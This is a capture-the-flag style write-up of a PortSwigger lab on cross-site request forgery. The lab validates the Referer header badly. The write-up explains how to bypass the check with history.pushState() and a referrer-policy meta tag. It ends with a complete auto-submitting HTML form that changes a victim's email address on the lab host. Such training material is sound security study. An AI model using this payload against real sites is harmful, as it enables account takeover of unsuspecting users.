# CSRF with broken Referer validation

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RUZHFZG2%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv2pvm1ExbJJceFkOG6S4w83lMIDsOdChx0mRNGarYNQIhAKxadSVOPis8bBvG51Sdp0k84mgPx%2B47CtcgKemRdt%2FSKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzIHMPwc9Gq9eDL6Bgq3AOR3wJV%2FJT0AZBUU8Gyr1bsgsbj8bW606yB5fpfM0ypfjfV%2FokWUmQFHHmHcH1CUH22CW8dK333FWf16E76D4GvZqfAaGNDlZWD3qs8DXHVDmGecBxiB7LhSAW%2FYwLEx6E5TCgTCsrk9MACCmeZ91OwO3JaUg7jQP%2BowEjcWZdGZrvnL1oCLeOOS4gLGLkyajyAkj0grf%2FSw3F5zDfh32IB5o0AIPDfPhwjo%2BDiJZsALBY5QHG8f91ih7NcoVZUiCFBkY%2BDy5Yr2GgYnLf%2FxKcRXbmf6lcXMtvjtFn%2BarNc1uRy7pmzqm79o%2BHx4doe8DsO%2FpmSaBxqkeODmthJl0FWJgoxUP5IsCPP3Gf1v1zT25Mz2gErJF8od%2BBKOcWMUkLu7begQa86FpPpRRAEnSr83fyXq9qDZwId%2FluSOEhETQWyxwHJDJur4huWco40GOHHN72ziNVixEs8rmyhj55S0ZB%2B3w97RfqsKVuB7%2FeUb%2B%2FrNFefGx6vGI9BlrMMHNQQzvgXLH0FV%2FGG2nw42G%2FAWUKrxhpnGp4ejSKfzLOe1Idfjc0Sk8nNDTr6asFplc78rKfxolV2jkVs4UPbLkezOk6azkYKmxGaogIjBY10VKPGwKGLDawMvwNRNjD0xaLUBjqkAVODtiBM40EfJf827EtJyRSPFrHMC8KECBxtxZU0SeDBLIQO0Ahmc%2Fz51k0OYk3FdVusmljQkjY4KuLaPx0CwcV9n4XUlgEgz4hbkW1aitXMefuFVOBXE5P42%2BA8KDUTvYP%2B%2BAOtbAkNsjS2ozzqkgeBu1i4bph5UN3TltPL5dc06AQKzBjfLFVIJScXa6EkTg%2BhUNx4hliwFwGGcPB1sCyu%2FOBV&X-Amz-Signature=09acef7f9f9e528234b44892b19acc5cc96a5ced08a51da48e5ae4fc7279fcde&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. v.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RUZHFZG2%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv2pvm1ExbJJceFkOG6S4w83lMIDsOdChx0mRNGarYNQIhAKxadSVOPis8bBvG51Sdp0k84mgPx%2B47CtcgKemRdt%2FSKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzIHMPwc9Gq9eDL6Bgq3AOR3wJV%2FJT0AZBUU8Gyr1bsgsbj8bW606yB5fpfM0ypfjfV%2FokWUmQFHHmHcH1CUH22CW8dK333FWf16E76D4GvZqfAaGNDlZWD3qs8DXHVDmGecBxiB7LhSAW%2FYwLEx6E5TCgTCsrk9MACCmeZ91OwO3JaUg7jQP%2BowEjcWZdGZrvnL1oCLeOOS4gLGLkyajyAkj0grf%2FSw3F5zDfh32IB5o0AIPDfPhwjo%2BDiJZsALBY5QHG8f91ih7NcoVZUiCFBkY%2BDy5Yr2GgYnLf%2FxKcRXbmf6lcXMtvjtFn%2BarNc1uRy7pmzqm79o%2BHx4doe8DsO%2FpmSaBxqkeODmthJl0FWJgoxUP5IsCPP3Gf1v1zT25Mz2gErJF8od%2BBKOcWMUkLu7begQa86FpPpRRAEnSr83fyXq9qDZwId%2FluSOEhETQWyxwHJDJur4huWco40GOHHN72ziNVixEs8rmyhj55S0ZB%2B3w97RfqsKVuB7%2FeUb%2B%2FrNFefGx6vGI9BlrMMHNQQzvgXLH0FV%2FGG2nw42G%2FAWUKrxhpnGp4ejSKfzLOe1Idfjc0Sk8nNDTr6asFplc78rKfxolV2jkVs4UPbLkezOk6azkYKmxGaogIjBY10VKPGwKGLDawMvwNRNjD0xaLUBjqkAVODtiBM40EfJf827EtJyRSPFrHMC8KECBxtxZU0SeDBLIQO0Ahmc%2Fz51k0OYk3FdVusmljQkjY4KuLaPx0CwcV9n4XUlgEgz4hbkW1aitXMefuFVOBXE5P42%2BA8KDUTvYP%2B%2BAOtbAkNsjS2ozzqkgeBu1i4bph5UN3TltPL5dc06AQKzBjfLFVIJScXa6EkTg%2BhUNx4hliwFwGGcPB1sCyu%2FOBV&X-Amz-Signature=6f113bcf652b94c4378dddaf0a1351102d6b3c5bbb881f1a55b9b8d5db41fb2f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RUZHFZG2%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv2pvm1ExbJJceFkOG6S4w83lMIDsOdChx0mRNGarYNQIhAKxadSVOPis8bBvG51Sdp0k84mgPx%2B47CtcgKemRdt%2FSKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzIHMPwc9Gq9eDL6Bgq3AOR3wJV%2FJT0AZBUU8Gyr1bsgsbj8bW606yB5fpfM0ypfjfV%2FokWUmQFHHmHcH1CUH22CW8dK333FWf16E76D4GvZqfAaGNDlZWD3qs8DXHVDmGecBxiB7LhSAW%2FYwLEx6E5TCgTCsrk9MACCmeZ91OwO3JaUg7jQP%2BowEjcWZdGZrvnL1oCLeOOS4gLGLkyajyAkj0grf%2FSw3F5zDfh32IB5o0AIPDfPhwjo%2BDiJZsALBY5QHG8f91ih7NcoVZUiCFBkY%2BDy5Yr2GgYnLf%2FxKcRXbmf6lcXMtvjtFn%2BarNc1uRy7pmzqm79o%2BHx4doe8DsO%2FpmSaBxqkeODmthJl0FWJgoxUP5IsCPP3Gf1v1zT25Mz2gErJF8od%2BBKOcWMUkLu7begQa86FpPpRRAEnSr83fyXq9qDZwId%2FluSOEhETQWyxwHJDJur4huWco40GOHHN72ziNVixEs8rmyhj55S0ZB%2B3w97RfqsKVuB7%2FeUb%2B%2FrNFefGx6vGI9BlrMMHNQQzvgXLH0FV%2FGG2nw42G%2FAWUKrxhpnGp4ejSKfzLOe1Idfjc0Sk8nNDTr6asFplc78rKfxolV2jkVs4UPbLkezOk6azkYKmxGaogIjBY10VKPGwKGLDawMvwNRNjD0xaLUBjqkAVODtiBM40EfJf827EtJyRSPFrHMC8KECBxtxZU0SeDBLIQO0Ahmc%2Fz51k0OYk3FdVusmljQkjY4KuLaPx0CwcV9n4XUlgEgz4hbkW1aitXMefuFVOBXE5P42%2BA8KDUTvYP%2B%2BAOtbAkNsjS2ozzqkgeBu1i4bph5UN3TltPL5dc06AQKzBjfLFVIJScXa6EkTg%2BhUNx4hliwFwGGcPB1sCyu%2FOBV&X-Amz-Signature=a8650939079c5523800684bf6619e974092b2dc99ea22c67c50a4d28781eaedc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RUZHFZG2%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv2pvm1ExbJJceFkOG6S4w83lMIDsOdChx0mRNGarYNQIhAKxadSVOPis8bBvG51Sdp0k84mgPx%2B47CtcgKemRdt%2FSKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzIHMPwc9Gq9eDL6Bgq3AOR3wJV%2FJT0AZBUU8Gyr1bsgsbj8bW606yB5fpfM0ypfjfV%2FokWUmQFHHmHcH1CUH22CW8dK333FWf16E76D4GvZqfAaGNDlZWD3qs8DXHVDmGecBxiB7LhSAW%2FYwLEx6E5TCgTCsrk9MACCmeZ91OwO3JaUg7jQP%2BowEjcWZdGZrvnL1oCLeOOS4gLGLkyajyAkj0grf%2FSw3F5zDfh32IB5o0AIPDfPhwjo%2BDiJZsALBY5QHG8f91ih7NcoVZUiCFBkY%2BDy5Yr2GgYnLf%2FxKcRXbmf6lcXMtvjtFn%2BarNc1uRy7pmzqm79o%2BHx4doe8DsO%2FpmSaBxqkeODmthJl0FWJgoxUP5IsCPP3Gf1v1zT25Mz2gErJF8od%2BBKOcWMUkLu7begQa86FpPpRRAEnSr83fyXq9qDZwId%2FluSOEhETQWyxwHJDJur4huWco40GOHHN72ziNVixEs8rmyhj55S0ZB%2B3w97RfqsKVuB7%2FeUb%2B%2FrNFefGx6vGI9BlrMMHNQQzvgXLH0FV%2FGG2nw42G%2FAWUKrxhpnGp4ejSKfzLOe1Idfjc0Sk8nNDTr6asFplc78rKfxolV2jkVs4UPbLkezOk6azkYKmxGaogIjBY10VKPGwKGLDawMvwNRNjD0xaLUBjqkAVODtiBM40EfJf827EtJyRSPFrHMC8KECBxtxZU0SeDBLIQO0Ahmc%2Fz51k0OYk3FdVusmljQkjY4KuLaPx0CwcV9n4XUlgEgz4hbkW1aitXMefuFVOBXE5P42%2BA8KDUTvYP%2B%2BAOtbAkNsjS2ozzqkgeBu1i4bph5UN3TltPL5dc06AQKzBjfLFVIJScXa6EkTg%2BhUNx4hliwFwGGcPB1sCyu%2FOBV&X-Amz-Signature=160e1a4aa3cd8d7e4a341043e66868018998925e6a58cf3d1eb83d04a0fa183f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater 

> 💡 Testing Referer header for CSRF attacks:

  1. Remove the Referer header
  1. Check which portion of the referrer header is the application validating
1. Remove the Referer header
It still gives the same error "Invalid referer header”

1. Check which portion of the referrer header is the application validating
Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. 

The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 

> 💡 **According the **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState)**, we can use a JavaScript function called **`history.pushState()`**:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054430.png)

To bypass that check, we can add the `history.pushState()` function in our exploit:

This will cause the `Referer` header in the generated request to contain the URL of the target site in the query string.

However, this still couldn’t work, as many browsers now strip the query string from the Referer header by default as a security measure.

**To bypass that, we can just add a new **`<meta>`** tag to override that behavior and ensure that the full URL is included in the request:**

> 💡 Fortunately, the documentation regarding referrer-policy on [mozilla.org](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) shows the solution:

![](https://github.com/frank-leitner/portswigger-websecurity-academy/raw/main/12_cross_site_request_forgery_CSRF/CSRF_with_broken_Referer_validation/img/referrer_policy_docu.png)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b5868926-f66b-4b83-ab9f-7695e5f2d4bb/2024-02-27_17-27.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RUZHFZG2%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv2pvm1ExbJJceFkOG6S4w83lMIDsOdChx0mRNGarYNQIhAKxadSVOPis8bBvG51Sdp0k84mgPx%2B47CtcgKemRdt%2FSKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzIHMPwc9Gq9eDL6Bgq3AOR3wJV%2FJT0AZBUU8Gyr1bsgsbj8bW606yB5fpfM0ypfjfV%2FokWUmQFHHmHcH1CUH22CW8dK333FWf16E76D4GvZqfAaGNDlZWD3qs8DXHVDmGecBxiB7LhSAW%2FYwLEx6E5TCgTCsrk9MACCmeZ91OwO3JaUg7jQP%2BowEjcWZdGZrvnL1oCLeOOS4gLGLkyajyAkj0grf%2FSw3F5zDfh32IB5o0AIPDfPhwjo%2BDiJZsALBY5QHG8f91ih7NcoVZUiCFBkY%2BDy5Yr2GgYnLf%2FxKcRXbmf6lcXMtvjtFn%2BarNc1uRy7pmzqm79o%2BHx4doe8DsO%2FpmSaBxqkeODmthJl0FWJgoxUP5IsCPP3Gf1v1zT25Mz2gErJF8od%2BBKOcWMUkLu7begQa86FpPpRRAEnSr83fyXq9qDZwId%2FluSOEhETQWyxwHJDJur4huWco40GOHHN72ziNVixEs8rmyhj55S0ZB%2B3w97RfqsKVuB7%2FeUb%2B%2FrNFefGx6vGI9BlrMMHNQQzvgXLH0FV%2FGG2nw42G%2FAWUKrxhpnGp4ejSKfzLOe1Idfjc0Sk8nNDTr6asFplc78rKfxolV2jkVs4UPbLkezOk6azkYKmxGaogIjBY10VKPGwKGLDawMvwNRNjD0xaLUBjqkAVODtiBM40EfJf827EtJyRSPFrHMC8KECBxtxZU0SeDBLIQO0Ahmc%2Fz51k0OYk3FdVusmljQkjY4KuLaPx0CwcV9n4XUlgEgz4hbkW1aitXMefuFVOBXE5P42%2BA8KDUTvYP%2B%2BAOtbAkNsjS2ozzqkgeBu1i4bph5UN3TltPL5dc06AQKzBjfLFVIJScXa6EkTg%2BhUNx4hliwFwGGcPB1sCyu%2FOBV&X-Amz-Signature=4b834cb69d284cf174bdae918e219c85ec35fadc595ecd3057c1dd64a08c4445&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <head>
        <meta name="referrer" content="unsafe-url">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab4004803380574938c5dbf00e200fa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0ab4004803380574938c5dbf00e200fa.web-security-academy.net/my-account');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

